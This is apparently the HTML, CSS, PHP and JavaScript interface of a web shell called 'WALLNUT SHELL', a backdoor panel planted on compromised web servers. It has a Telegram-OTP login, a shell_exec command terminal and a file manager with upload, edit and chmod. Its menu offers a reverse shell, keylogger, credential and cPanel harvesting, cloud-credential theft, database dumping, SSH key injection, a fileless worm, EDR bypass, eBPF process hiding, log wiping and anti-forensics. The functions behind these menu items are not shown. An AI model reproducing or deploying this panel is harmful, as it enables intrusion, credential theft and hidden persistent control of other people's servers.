        a:hover { color:var(--text-accent); opacity:0.8; }

        .login-wrapper { display:flex; align-items:center; justify-content:center; min-height:100vh; padding:20px; background:var(--bg-primary); position:relative; overflow:hidden; }
        .login-wrapper::before { content:''; position:absolute; width:600px; height:600px; border-radius:50%; background:radial-gradient(circle, rgba(100,240,184,0.04), transparent 70%); top:-200px; right:-200px; pointer-events:none; }
        .login-wrapper::after { content:''; position:absolute; width:400px; height:400px; border-radius:50%; background:radial-gradient(circle, rgba(100,240,184,0.03), transparent 70%); bottom:-150px; left:-150px; pointer-events:none; }
        .login-box { background:var(--bg-glass); backdrop-filter:blur(24px); -webkit-backdrop-filter:blur(24px); border:1px solid var(--border-card); border-radius:var(--radius-xl); padding:48px 40px 40px; max-width:420px; width:100%; position:relative; box-shadow:var(--shadow-card), var(--shadow-glow); }
        .login-box::before { content:''; position:absolute; inset:-1px; border-radius:var(--radius-xl); padding:1px; background:linear-gradient(135deg, rgba(100,240,184,0.1), transparent 50%, rgba(100,240,184,0.05)); -webkit-mask:linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0); mask:linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0); -webkit-mask-composite:xor; mask-composite:exclude; pointer-events:none; }
        .login-brand { text-align:center; margin-bottom:32px; }
        .login-brand h1 { font-size:28px; font-weight:700; letter-spacing:-0.5px; color:var(--text-primary); }
        .login-brand h1 span { color:var(--text-accent); text-shadow:0 0 40px rgba(100,240,184,0.1); }
        .login-brand p { color:var(--text-muted); font-size:12px; letter-spacing:0.5px; margin-top:4px; font-weight:400; }
        .login-divider { border:none; border-top:1px solid var(--border-card); margin:20px 0; }

        .form-group { margin-bottom:16px; }
        .form-group label { display:block; font-size:11px; font-weight:600; color:var(--text-muted); text-transform:uppercase; letter-spacing:0.8px; margin-bottom:6px; }
        .form-control { width:100%; padding:10px 14px; background:var(--bg-input); border:1px solid var(--border-card); border-radius:var(--radius-md); color:var(--text-primary); font-family:var(--font); font-size:14px; transition:var(--transition); outline:none; }
        .form-control:focus { border-color:var(--text-accent); box-shadow:0 0 0 3px var(--glow-accent); }
        .form-control::placeholder { color:var(--text-muted); opacity:0.5; }

        .btn { display:inline-flex; align-items:center; justify-content:center; gap:8px; padding:10px 20px; background:rgba(255,255,255,0.03); border:1px solid var(--border-card); border-radius:var(--radius-md); color:var(--text-secondary); font-family:var(--font); font-size:13px; font-weight:500; cursor:pointer; transition:var(--transition); outline:none; }
        .btn:hover { background:var(--bg-card-hover); border-color:var(--text-accent); color:var(--text-accent); transform:translateY(-1px); }
        .btn-block { display:flex; width:100%; justify-content:center; }
        .btn-primary { background:rgba(100,240,184,0.1); border-color:var(--text-accent); color:var(--text-accent); }
        .btn-primary:hover { background:rgba(100,240,184,0.2); box-shadow:0 0 30px var(--glow-accent); }
        .btn-danger { border-color:rgba(255,70,85,0.3); color:#ff4655; }
        .btn-danger:hover { background:rgba(255,70,85,0.1); border-color:#ff4655; }
        .btn-success { border-color:rgba(60,210,120,0.3); color:#3cd278; }
        .btn-success:hover { background:rgba(60,210,120,0.1); border-color:#3cd278; }
        .btn-warning { border-color:rgba(255,180,50,0.3); color:#ffb432; }
        .btn-warning:hover { background:rgba(255,180,50,0.1); border-color:#ffb432; }
        .btn-sm { padding:5px 12px; font-size:11px; }

        .app-container { display:flex; min-height:100vh; }
        .main-content { flex:1; padding:24px 28px; margin-left:240px; transition:var(--transition); }
        @media(max-width:768px){ .main-content { margin-left:0; padding:16px; } }

        .sidebar { width:240px; background:var(--bg-secondary); border-right:1px solid var(--border-card); height:100vh; position:fixed; top:0; left:0; overflow-y:auto; display:flex; flex-direction:column; z-index:100; transition:transform 0.3s cubic-bezier(0.4,0,0.2,1); backdrop-filter:blur(20px); }
        .sidebar-header { padding:20px 20px 16px; border-bottom:1px solid var(--border-card); }
        .sidebar-title { font-size:18px; font-weight:700; letter-spacing:-0.3px; color:var(--text-primary); }
        .sidebar-title span { color:var(--text-accent); }
        .sidebar-subtitle { font-size:10px; color:var(--text-muted); word-break:break-all; margin-top:2px; opacity:0.6; font-weight:400; letter-spacing:0.3px; }
        .sidebar-menu { padding:12px 8px; flex:1; overflow-y:auto; }
        .menu-section { margin-bottom:4px; }
        .menu-title { font-size:9px; text-transform:uppercase; letter-spacing:1.2px; color:var(--text-muted); padding:6px 12px; margin-bottom:2px; font-weight:600; opacity:0.5; }
        .menu-item { display:flex; align-items:center; gap:10px; padding:7px 14px; border-radius:var(--radius-md); color:var(--text-secondary); cursor:pointer; transition:var(--transition); font-size:12.5px; background:transparent; border:none; width:100%; text-align:left; position:relative; font-family:var(--font); }
        .menu-item::before { content:''; position:absolute; left:0; top:50%; transform:translateY(-50%); width:2px; height:0; background:var(--text-accent); border-radius:0 3px 3px 0; transition:var(--transition); }
        .menu-item:hover { background:var(--bg-card-hover); color:var(--text-primary); }
        .menu-item:hover::before { height:18px; }
        .menu-item i { width:18px; text-align:center; font-size:13px; opacity:0.6; }
        .menu-item:hover i { opacity:1; }
        .menu-item.danger { color:#ff4655; }
        .menu-item.danger:hover { background:var(--glow-danger); color:#ff4655; }
        .menu-item.danger:hover::before { background:#ff4655; }
        .menu-item.success { color:#3cd278; }
        .menu-item.success:hover { background:var(--glow-success); color:#3cd278; }
        .menu-item.success:hover::before { background:#3cd278; }
        .menu-item.warning { color:#ffb432; }
        .menu-item.warning:hover { background:var(--glow-warning); color:#ffb432; }
        .menu-item.warning:hover::before { background:#ffb432; }
        .logout-btn { margin-top:auto; border-top:1px solid var(--border-card); padding-top:12px; margin-top:8px; color:var(--text-muted); }
        .logout-btn:hover { color:#ff4655; background:var(--glow-danger); }

        .menu-toggle { display:none; position:fixed; top:12px; left:12px; z-index:999; background:var(--bg-glass); backdrop-filter:blur(12px); border:1px solid var(--border-card); color:var(--text-secondary); border-radius:var(--radius-md); padding:8px 12px; cursor:pointer; font-size:16px; transition:var(--transition); }
        .menu-toggle:hover { border-color:var(--text-accent); color:var(--text-accent); }
        @media(max-width:768px){ .menu-toggle { display:block; } .sidebar { transform:translateX(-100%); width:280px; background:var(--bg-primary); } .sidebar.active { transform:translateX(0); } .sidebar.active::after { content:''; position:fixed; inset:0; background:rgba(0,0,0,0.5); z-index:-1; } }

        .card { background:var(--bg-card); border-radius:var(--radius-lg); border:1px solid var(--border-card); margin-bottom:16px; overflow:hidden; transition:var(--transition); }
        .card:hover { border-color:var(--border-subtle); }
        .card-header { padding:14px 20px; border-bottom:1px solid var(--border-card); display:flex; justify-content:space-between; align-items:center; font-size:13px; font-weight:500; color:var(--text-secondary); }
        .card-body { padding:16px 20px; max-height:60vh; overflow-y:auto; }

        .table { width:100%; border-collapse:collapse; font-size:12.5px; }
        .table th { text-align:left; padding:8px 10px; border-bottom:1px solid var(--border-card); color:var(--text-muted); font-weight:600; font-size:10px; text-transform:uppercase; letter-spacing:0.5px; position:sticky; top:0; background:var(--bg-card); }
        .table td { padding:6px 10px; border-bottom:1px solid var(--border-card); }
        .table tr:hover td { background:var(--bg-card-hover); }
        .folder { color:var(--text-accent); font-weight:500; }
        .file { color:var(--text-secondary); }
        .file-icon { margin-right:6px; }

        .action-links { display:flex; gap:4px; flex-wrap:wrap; }
        .action-links a { font-size:10px; color:var(--text-muted); padding:2px 8px; border-radius:var(--radius-sm); background:rgba(255,255,255,0.02); transition:var(--transition); border:1px solid transparent; }
        .action-links a:hover { color:var(--text-accent); background:var(--glow-accent); border-color:var(--border-active); }
        .action-links a.danger:hover { color:#ff4655; background:var(--glow-danger); border-color:rgba(255,70,85,0.2); }

        .breadcrumb { padding:6px 0 12px; font-size:12px; color:var(--text-muted); overflow-x:auto; white-space:nowrap; }
        .breadcrumb a { color:var(--text-secondary); transition:var(--transition); }
        .breadcrumb a:hover { color:var(--text-accent); }

        .stats-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(100px, 1fr)); gap:8px; margin-bottom:14px; }
        .stat-item { background:var(--bg-input); padding:10px 14px; border-radius:var(--radius-md); border:1px solid var(--border-card); text-align:center; }
        .stat-item .stat-value { font-size:16px; font-weight:600; color:var(--text-accent); }
        .stat-item .stat-label { font-size:9px; color:var(--text-muted); text-transform:uppercase; letter-spacing:0.5px; margin-top:2px; }

        .alert { padding:10px 16px; border-radius:var(--radius-md); margin-bottom:12px; font-size:13px; border-left:3px solid; }
        .alert-danger { background:var(--glow-danger); border-color:#ff4655; color:#ff4655; }
        .alert-success { background:var(--glow-success); border-color:#3cd278; color:#3cd278; }
        .alert-warning { background:var(--glow-warning); border-color:#ffb432; color:#ffb432; }

        .terminal-output { background:var(--bg-input); padding:12px 16px; border-radius:var(--radius-md); font-family:var(--font-mono); font-size:12px; max-height:280px; overflow-y:auto; white-space:pre-wrap; word-break:break-all; border:1px solid var(--border-card); margin-bottom:10px; line-height:1.6; color:var(--text-secondary); }
        .terminal-input { display:flex; gap:8px; flex-wrap:wrap; }
        .terminal-input .form-control { flex:1; min-width:120px; font-family:var(--font-mono); font-size:13px; }

        .modal { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); display:flex; align-items:center; justify-content:center; z-index:1000; opacity:0; visibility:hidden; transition:0.25s; backdrop-filter:blur(12px); }
        .modal.active { opacity:1; visibility:visible; }
        .modal-content { background:var(--bg-card); border-radius:var(--radius-lg); max-width:520px; width:95%; max-height:90vh; overflow-y:auto; border:1px solid var(--border-card); transform:translateY(20px) scale(0.96); transition:0.3s cubic-bezier(0.4,0,0.2,1); box-shadow:var(--shadow-card); }
        .modal.active .modal-content { transform:translateY(0) scale(1); }
        .modal-header { padding:16px 20px; border-bottom:1px solid var(--border-card); display:flex; justify-content:space-between; align-items:center; }
        .modal-title { font-size:16px; font-weight:600; color:var(--text-primary); }
        .modal-close { background:none; border:none; color:var(--text-muted); font-size:20px; cursor:pointer; padding:0 4px; transition:var(--transition); }
        .modal-close:hover { color:var(--text-primary); transform:rotate(90deg); }
        .modal-body { padding:20px; }

        .badge { display:inline-block; padding:2px 10px; border-radius:10px; font-size:9px; font-weight:600; text-transform:uppercase; letter-spacing:0.3px; }
        .badge-root { background:rgba(255,70,85,0.2); color:#ff4655; }
        .badge-user { background:rgba(255,255,255,0.06); color:var(--text-muted); }
        .badge-shell { background:var(--glow-warning); color:#ffb432; }
        .badge-chattr { background:var(--glow-success); color:#3cd278; }
        .badge-on { background:var(--glow-success); color:#3cd278; }
        .badge-off { background:var(--glow-danger); color:#ff4655; }

        .toast-container { position:fixed; top:24px; right:24px; z-index:9999; display:flex; flex-direction:column; gap:8px; }
        .toast { padding:12px 20px; border-radius:var(--radius-md); background:var(--bg-glass); backdrop-filter:blur(20px); border:1px solid var(--border-card); color:var(--text-secondary); font-size:13px; box-shadow:var(--shadow-card); animation:slideIn 0.3s ease; max-width:380px; font-family:var(--font); }
        .toast-success { border-left:3px solid #3cd278; }
        .toast-error { border-left:3px solid #ff4655; }
        .toast-info { border-left:3px solid var(--text-accent); }
        .toast-warning { border-left:3px solid #ffb432; }
        @keyframes slideIn { from { transform:translateX(100%); opacity:0; } to { transform:translateX(0); opacity:1; } }
        @keyframes slideOut { from { transform:translateX(0); opacity:1; } to { transform:translateX(100%); opacity:0; } }

        @media(max-width:480px){ .login-box { padding:32px 24px; } .table { font-size:11px; } .table th, .table td { padding:4px 6px; } .action-links a { font-size:9px; padding:1px 6px; } .stats-grid { grid-template-columns:repeat(2, 1fr); } }
    </style>
</head>
<body>

<?php if (!isset($_SESSION['loggedin']) || (isset($_SESSION['login_time']) && time() - $_SESSION['login_time'] > 1800)): ?>
    <?php 
    if (isset($_SESSION['loggedin']) && time() - $_SESSION['login_time'] > 1800) {
        session_destroy();
        session_start();
        $_SESSION['logout_success'] = true;
    }
    ?>
    <div class="login-wrapper">
        <div class="login-box">
            <div class="login-brand">
                <h1>WALLNUT SHELL<span>✦</span></h1>
                <p>owner Dkid03</p>
            </div>
            <?php if (!empty($loginError)): ?>
                <div class="alert alert-danger"><?= htmlspecialchars($loginError) ?></div>
            <?php endif; ?>
            <?php if (!empty($loginSuccess)): ?>
                <div class="alert alert-success"><?= htmlspecialchars($loginSuccess) ?></div>
            <?php endif; ?>
            <?php if (isset($_SESSION['logout_success'])): ?>
                <div class="alert alert-success">Logout successful <?php unset($_SESSION['logout_success']); ?></div>
            <?php endif; ?>
            <form method="post">
                <div class="form-group">
                    <button type="submit" name="request_otp" class="btn btn-block btn-primary">
                        <i class="fab fa-telegram"></i> Send OTP to Telegram
                    </button>
                </div>
            </form>
            <?php if (isset($_SESSION['otp'])): ?>
            <hr class="login-divider">
            <form method="post">
                <div class="form-group">
                    <label for="otp">OTP Code</label>
                    <input type="text" id="otp" name="otp" class="form-control" placeholder="6 digits" maxlength="6" required autofocus>
                </div>
                <button type="submit" name="verify_otp" class="btn btn-block btn-success">Login</button>
            </form>
            <?php endif; ?>
        </div>
    </div>
<?php else: ?>
    <div class="app-container">
        <button class="menu-toggle" onclick="document.querySelector('.sidebar').classList.toggle('active')">
            <i class="fas fa-bars"></i>
        </button>
        
        <div class="sidebar">
            <div class="sidebar-header">
                <div class="sidebar-title">WALLNUT SHELL<span>✦</span></div>
                <div class="sidebar-subtitle"><?= htmlspecialchars($currentPath) ?></div>
            </div>
            <div class="sidebar-menu">
                <div class="menu-section">
                    <div class="menu-title">File</div>
                    <a href="?" class="menu-item"><i class="fas fa-folder"></i> Manager</a>
                    <div class="menu-item" onclick="showModal('uploadModal')"><i class="fas fa-upload"></i> Upload</div>
                    <div class="menu-item" onclick="showModal('createModal')"><i class="fas fa-file"></i> File</div>
                    <div class="menu-item" onclick="showModal('createFolderModal')"><i class="fas fa-folder-plus"></i> Folder</div>
                    <div class="menu-item" onclick="showModal('bulkDeleteModal')"><i class="fas fa-trash-alt"></i> Bulk Delete</div>
                </div>
                
                <div class="menu-section">
                    <div class="menu-title"> Advanced</div>
                    <div class="menu-item" onclick="runHideProcessEBPF()"><i class="fas fa-eye-slash"></i> eBPF Process Hider</div>
                    <div class="menu-item" onclick="runHideFileEBPF()"><i class="fas fa-eye-slash"></i> eBPF File Hider</div>
                    <div class="menu-item danger" onclick="runEDRBypass()"><i class="fas fa-shield-virus"></i> EDR Bypass</div>
                    <div class="menu-item danger" onclick="runAutoRootModern()" style="font-weight:600;"><i class="fas fa-skull-crossbones"></i> Modern Root Exploit</div>
                    <div class="menu-item warning" onclick="runPersistenceAdvanced()"><i class="fas fa-cog"></i> Advanced Persistence</div>
                    <div class="menu-item warning" onclick="runCredHarvest()"><i class="fas fa-user-secret"></i> Credential Harvest</div>
                    <div class="menu-item danger" onclick="runSelfDestructAdvanced()"><i class="fas fa-bomb"></i> Self Destruct</div>
                </div>
                
                <div class="menu-section">
                    <div class="menu-title">Worm</div>
                    <div class="menu-item" onclick="runWorm()"><i class="fas fa-bug"></i> Fileless Worm</div>
                </div>
                
                <div class="menu-section">
                    <div class="menu-title">Persistence</div>
                    <div class="menu-item" onclick="runBackup()"><i class="fas fa-copy"></i> Backup File</div>
                    <div class="menu-item danger" onclick="runDeleteBackup()"><i class="fas fa-trash-alt"></i> Delete Backups</div>
                    <div class="menu-item" onclick="runCronPersistence()"><i class="fas fa-clock"></i> Cron Persistence</div>
                    <div class="menu-item" onclick="runUserPersistence()"><i class="fas fa-user-plus"></i> User Persistence</div>
                </div>
                
                <div class="menu-section">
                    <div class="menu-title">Scan & Harvest</div>
                    <div class="menu-item" onclick="runWPScan()"><i class="fab fa-wordpress"></i> WP Scan</div>
                    <div class="menu-item" onclick="runConfigFinder()"><i class="fas fa-file-alt"></i> Config Finder</div>
                    <div class="menu-item" onclick="runDumpDB()"><i class="fas fa-database"></i> Dump DB</div>
                    <div class="menu-item" onclick="runCpanelHarvest()"><i class="fas fa-search"></i> cPanel Harvest</div>
                    <div class="menu-item" onclick="runCloudCreds()"><i class="fas fa-cloud"></i> Cloud Creds</div>
                    <div class="menu-item" onclick="runDbExplorer()"><i class="fas fa-database"></i> DB Explorer</div>
                </div>
                
                <div class="menu-section">
                    <div class="menu-title">Post-Exploit</div>
                    <div class="menu-item" onclick="runFirewallKiller()"><i class="fas fa-fire"></i> Firewall Killer</div>
                    <div class="menu-item" onclick="runNetworkPivot()"><i class="fas fa-network-wired"></i> Network Pivot</div>
                    <div class="menu-item" onclick="runKeylogger()"><i class="fas fa-keyboard"></i> Keylogger</div>
                    <div class="menu-item" onclick="runReverseShell()"><i class="fas fa-terminal"></i> Reverse Shell</div>
                    <div class="menu-item" onclick="runPortScan()"><i class="fas fa-search"></i> Port Scanner</div>
                    <div class="menu-item" onclick="runCleanLogs()"><i class="fas fa-eraser"></i> Clean Logs</div>
                    <div class="menu-item" onclick="runOneClick()"><i class="fas fa-broom"></i> One Click Cleanup</div>
                </div>
                
                <div class="menu-section">
                    <div class="menu-title">SSH</div>
                    <div class="menu-item" onclick="runSSHKeys()"><i class="fas fa-key"></i> SSH Keys</div>
                    <div class="menu-item" onclick="runSSHInject()"><i class="fas fa-key"></i> SSH Inject</div>
                    <div class="menu-item success" onclick="runCreateSSH()"><i class="fas fa-terminal"></i> Create SSH</div>
                </div>
                
                <div class="menu-section">
                    <div class="menu-title">Users</div>
                    <div class="menu-item success" onclick="runCreateRDP()"><i class="fas fa-desktop"></i> Create RDP</div>
                    <div class="menu-item success" onclick="runCreateFTP()"><i class="fas fa-folder-open"></i> Create FTP</div>
                    <div class="menu-item" onclick="runCreateMail()"><i class="fas fa-envelope"></i> Create Mail</div>
                </div>
                
                <div class="menu-section">
                    <div class="menu-title">Inject</div>
                    <div class="menu-item" onclick="runInjectRestore()"><i class="fas fa-code"></i> Inject Restore</div>
                    <div class="menu-item" onclick="runAutoPrepend()"><i class="fas fa-cog"></i> Auto Prepend</div>
                </div>
                
                <div class="menu-section">
                    <div class="menu-title">Utility</div>
                    <a href="?terminal" class="menu-item"><i class="fas fa-terminal"></i> Terminal</a>
                    <div class="menu-item" onclick="runAntiForensic()"><i class="fas fa-broom"></i> Anti Forensic</div>
                    <div class="menu-item" onclick="runCloneShell()"><i class="fas fa-copy"></i> Clone Shell</div>
                    <div class="menu-item" onclick="runListSpread()"><i class="fas fa-list"></i> List Spread</div>
                </div>
                
                <div class="menu-section">
                    <div class="menu-title">Exit</div>
                    <a href="?logout=1" class="menu-item logout-btn"><i class="fas fa-sign-out-alt"></i> Logout</a>
                </div>
            </div>
        </div>

        <div class="main-content">
            <?php if (isset($_GET['terminal'])): ?>
                <div class="terminal-container">
                    <?php $sysInfo = getSystemInfo(); ?>
                    <div class="card">
                        <div class="card-header"><span>System Info</span></div>
                        <div class="card-body">
                            <?php foreach ($sysInfo as $label => $value): ?>
                            <div style="display:flex;border-bottom:1px solid var(--border-card);padding:4px 0;font-size:12px;">
                                <span style="width:140px;color:var(--text-muted);"><?= htmlspecialchars($label) ?>:</span>
                                <span><?= htmlspecialchars($value) ?></span>
                            </div>
                            <?php endforeach; ?>
                        </div>
                    </div>
                    <div class="card">
                        <div class="card-header"><span>Terminal</span></div>
                        <div class="card-body">
                            <?php if (!$terminalActive): ?>
                                <div class="alert alert-danger">Terminal tidak aktif (shell_exec dinonaktifkan).</div>
                            <?php endif; ?>
                            <div class="terminal-output"><?= htmlspecialchars($terminalOutput) ?: 'Ready.' ?></div>
                            <form method="post" class="terminal-input">
                                <input type="text" name="command" class="form-control" placeholder="ls -la" autocomplete="off" <?= $terminalActive ? '' : 'disabled' ?>>
                                <button type="submit" name="run_command" class="btn btn-primary btn-sm" <?= $terminalActive ? '' : 'disabled' ?>>Run</button>
                            </form>
                        </div>
                    </div>
                </div>
            <?php else: ?>
                <div style="margin-bottom:16px;">
                    <h1 style="font-size:22px;font-weight:700;color:var(--text-primary);text-align:center;">
                        WALLNUT SHELL <span style="color:var(--text-accent);">✦</span>
                    </h1>
                    <p style="text-align:center;font-size:12px;color:var(--text-muted);">owner Dkid03</p>
                    <div style="text-align:center;font-size:10px;color:var(--text-muted);margin-top:6px;">
                        <span class="badge <?= isRoot() ? 'badge-root' : 'badge-user' ?>"><?= isRoot() ? 'ROOT' : 'USER' ?></span>
                        <span class="badge badge-shell"><?= isShellExecAvailable() ? 'shell ON' : 'shell OFF' ?></span>
                        <span class="badge <?= isChattrAvailable() ? 'badge-chattr' : 'badge-off' ?>"><?= isChattrAvailable() ? 'chattr OK' : 'chattr OFF' ?></span>
                    </div>
                    <div class="stats-grid">
                        <div class="stat-item">
                            <div class="stat-value"><?= count(scandir($currentPath)) - 2 ?></div>
                            <div class="stat-label">Items</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value"><?= date('H:i') ?></div>
                            <div class="stat-label">Time</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value"><?= round(memory_get_usage() / 1024 / 1024, 1) ?> MB</div>
                            <div class="stat-label">Memory</div>
                        </div>
                    </div>
                </div>
                <?php if (isset($error)): ?>
                    <div class="alert alert-danger"><?= htmlspecialchars($error) ?></div>
                <?php endif; ?>
                <?php if (isset($success)): ?>
                    <div class="alert alert-success"><?= htmlspecialchars($success) ?></div>
                <?php endif; ?>
                <div class="breadcrumb">
                    <?= breadcrumb($currentPath, $rootPath, $specialDirectories) ?>
                </div>
                <div class="card">
                    <div class="card-header">
                        <span>Files</span>
                        <span><?= count(scandir($currentPath)) - 2 ?> items</span>
                    </div>
                    <div class="card-body">
                        <table class="table">
                            <thead><tr><th>Name</th><th>Size</th><th>Perm</th><th>Actions</th></tr></thead>
                            <tbody>
                                <?php if ($currentPath !== $rootPath || !empty($specialDirectories)): ?>
                                    <tr><td><a href="?path=<?= urlencode(dirname($currentPath)) ?>" class="folder">..</a></td><td>-</td><td>-</td><td>-</td></tr>
                                <?php endif; ?>
                                <?php
                                $items = @scandir($currentPath) ?: [];
                                foreach ($items as $item) {
                                    if ($item === '.' || $item === '..') continue;
                                    $itemPath = $currentPath . DIRECTORY_SEPARATOR . $item;
                                    $isDir = is_dir($itemPath);
                                    $size = $isDir ? '-' : formatSize(@filesize($itemPath));
                                    $perms = @fileperms($itemPath);
                                    $permsFormatted = $perms ? substr(sprintf('%o', $perms), -4) : 'Error';
                                ?>
                                    <tr>
                                        <td>
                                            <?php if ($isDir): ?>
                                                <a href="?path=<?= urlencode($itemPath) ?>" class="folder"><i class="fas fa-folder file-icon"></i><?= htmlspecialchars($item) ?></a>
                                            <?php else: ?>
                                                <span class="file"><i class="fas fa-file file-icon"></i><?= htmlspecialchars($item) ?></span>
                                            <?php endif; ?>
                                        </td>
                                        <td><?= $size ?></td>
                                        <td><?= $permsFormatted ?></td>
                                        <td class="action-links">
                                            <?php if (!$isDir && in_array(strtolower(pathinfo($item, PATHINFO_EXTENSION)), $editableExtensions) && $item !== basename(__FILE__)): ?>
                                                <a href="#" onclick="editFile('<?= htmlspecialchars($item) ?>')">Edit</a>
                                            <?php endif; ?>
                                            <a href="#" onclick="showRename('<?= htmlspecialchars($item) ?>')">Rename</a>
                                            <a href="?path=<?= urlencode($currentPath) ?>&action=download&target=<?= urlencode($item) ?>">DL</a>
                                            <a href="#" onclick="confirmDelete('<?= htmlspecialchars($item) ?>')" class="danger">Del</a>
                                            <a href="#" onclick="showChmod('<?= htmlspecialchars($item) ?>', '<?= $permsFormatted ?>')">Chmod</a>
                                        </td>
                                    </tr>
                                <?php } ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            <?php endif; ?>
        </div>
    </div>

    <div id="toastContainer" class="toast-container"></div>

    <div id="createModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <div class="modal-title">New File</div>
                <button class="modal-close" onclick="hideModal('createModal')">&times;</button>
            </div>
            <div class="modal-body">
                <form method="post" action="?path=<?= urlencode($currentPath) ?>">
                    <div class="form-group">
                        <label>File Name</label>
                        <input type="text" name="name" class="form-control" placeholder="nama_file.php" required autofocus>
                    </div>
                    <input type="hidden" name="type" value="file"><input type="hidden" name="create" value="1">
                    <button type="submit" class="btn btn-block btn-success">Create</button>
                </form>
            </div>
        </div>
    </div>

    <div id="createFolderModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <div class="modal-title">New Folder</div>
                <button class="modal-close" onclick="hideModal('createFolderModal')">&times;</button>
            </div>
            <div class="modal-body">
                <form method="post" action="?path=<?= urlencode($currentPath) ?>">
                    <div class="form-group">
                        <label>Folder Name</label>
                        <input type="text" name="name" class="form-control" placeholder="nama_folder" required autofocus>
                    </div>
                    <input type="hidden" name="type" value="folder"><input type="hidden" name="create" value="1">
                    <button type="submit" class="btn btn-block btn-success">Create</button>
                </form>
            </div>
        </div>
    </div>

    <div id="uploadModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <div class="modal-title">Upload</div>
                <button class="modal-close" onclick="hideModal('uploadModal')">&times;</button>
            </div>
            <div class="modal-body">
                <form method="post" enctype="multipart/form-data" action="?path=<?= urlencode($currentPath) ?>">
                    <div class="form-group">
                        <input type="file" name="upload[]" class="form-control" multiple required>
                    </div>
                    <div class="form-group">
                        <label>Upload Mode</label>
                        <div style="display:flex;gap:12px;flex-wrap:wrap;margin-top:4px;">
                            <label style="font-size:12px;display:flex;align-items:center;gap:4px;cursor:pointer;">
                                <input type="radio" name="upload_mode" value="normal" checked> Normal
                            </label>
                            <label style="font-size:12px;display:flex;align-items:center;gap:4px;cursor:pointer;">
                                <input type="radio" name="upload_mode" value="bulk_shallow"> Shallow
                            </label>
                            <label style="font-size:12px;display:flex;align-items:center;gap:4px;cursor:pointer;">
                                <input type="radio" name="upload_mode" value="bulk_deep"> Deep
                            </label>
                        </div>
                    </div>
                    <button type="submit" class="btn btn-block btn-success">Upload</button>
                </form>
            </div>
        </div>
    </div>

    <div id="bulkDeleteModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <div class="modal-title">Bulk Delete</div>
                <button class="modal-close" onclick="hideModal('bulkDeleteModal')">&times;</button>
            </div>
            <div class="modal-body">
                <form method="post" action="?path=<?= urlencode($currentPath) ?>">
                    <div class="form-group">
                        <label>File List (one per line)</label>
                        <textarea name="file_list" class="form-control" rows="6" placeholder="file1.php&#10;file2.txt&#10;folder/"></textarea>
                    </div>
                    <div class="form-group">
                        <label>Delete Mode</label>
                        <div style="display:flex;gap:12px;flex-wrap:wrap;margin-top:4px;">
                            <label style="font-size:12px;display:flex;align-items:center;gap:4px;cursor:pointer;">
                                <input type="radio" name="delete_mode" value="current" checked> Current
                            </label>
                            <label style="font-size:12px;display:flex;align-items:center;gap:4px;cursor:pointer;">
                                <input type="radio" name="delete_mode" value="shallow"> Shallow
                            </label>
                            <label style="font-size:12px;display:flex;align-items:center;gap:4px;cursor:pointer;">
                                <input type="radio" name="delete_mode" value="deep"> Deep
                            </label>
                        </div>
                    </div>
                    <button type="submit" name="delete_bulk" class="btn btn-block btn-danger" onclick="return confirm('Are you sure?')">Delete</button>
                </form>
            </div>
        </div>
    </div>

    <div id="renameModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <div class="modal-title">Rename</div>
                <button class="modal-close" onclick="hideModal('renameModal')">&times;</button>
            </div>
            <div class="modal-body">
                <form method="post" action="?path=<?= urlencode($currentPath) ?>">
                    <div class="form-group">
                        <label>New Name</label>
                        <input type="text" id="newName" name="new_name" class="form-control" required autofocus>
                    </div>
                    <input type="hidden" id="renameTarget" name="target"><input type="hidden" name="rename" value="1">
                    <button type="submit" class="btn btn-block btn-success">Rename</button>
                </form>
            </div>
        </div>
    </div>

    <div id="editModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <div class="modal-title">Edit</div>
                <button class="modal-close" onclick="hideModal('editModal')">&times;</button>
            </div>
            <div class="modal-body">
                <form method="post" action="?path=<?= urlencode($currentPath) ?>">
                    <div class="form-group">
                        <textarea id="fileContent" name="content" class="form-control" style="min-height:250px;font-family:var(--font-mono);font-size:12px;"></textarea>
                    </div>
                    <input type="hidden" id="editFileName" name="file"><input type="hidden" name="save_file" value="1">
                    <button type="submit" class="btn btn-block btn-success">Save</button>
                </form>
            </div>
        </div>
    </div>

    <div id="chmodModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <div class="modal-title">CHMOD</div>
                <button class="modal-close" onclick="hideModal('chmodModal')">&times;</button>
            </div>
            <div class="modal-body">
                <form method="post" action="?path=<?= urlencode($currentPath) ?>">
                    <div class="form-group">
                        <label>Permission Mode</label>
                        <input type="text" id="permission" name="mode" class="form-control" placeholder="0644" required autofocus>
                    </div>
                    <input type="hidden" id="chmodTarget" name="target"><input type="hidden" name="action" value="chmod">
                    <button type="submit" class="btn btn-block btn-success">Change</button>
                </form>
            </div>
        </div>
    </div>

    <script>
        function showToast(message, type = 'info') {
            const container = document.getElementById('toastContainer');
            const toast = document.createElement('div');
            toast.className = `toast toast-${type}`;
            const icons = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️' };
            toast.innerHTML = `${icons[type] || 'ℹ️'} ${message}`;
            container.appendChild(toast);
            setTimeout(() => {
                toast.style.animation = 'slideOut 0.3s ease forwards';
                setTimeout(() => toast.remove(), 300);
            }, 4000);
        }

        function showModal(id){ document.getElementById(id).classList.add('active'); }
        function hideModal(id){ document.getElementById(id).classList.remove('active'); }

        function confirmDelete(file) {
            if(confirm(`Delete "${file}"?`)) {
                window.location.href = `?path=<?= urlencode($currentPath) ?>&action=delete&target=${encodeURIComponent(file)}`;
            }
        }

        function editFile(f){
            if(f === '<?= basename(__FILE__) ?>') { 
                showToast('Cannot edit this file.', 'warning');
                return; 
            }
            showToast('Loading file...', 'info');
            fetch('?path=<?= urlencode($currentPath) ?>&edit='+encodeURIComponent(f))
                .then(r => {
                    if(!r.ok) throw new Error('Network error');
                    return r.text();
                })
                .then(d => {
                    document.getElementById('fileContent').value = d;
                    document.getElementById('editFileName').value = f;
                    showModal('editModal');
                })
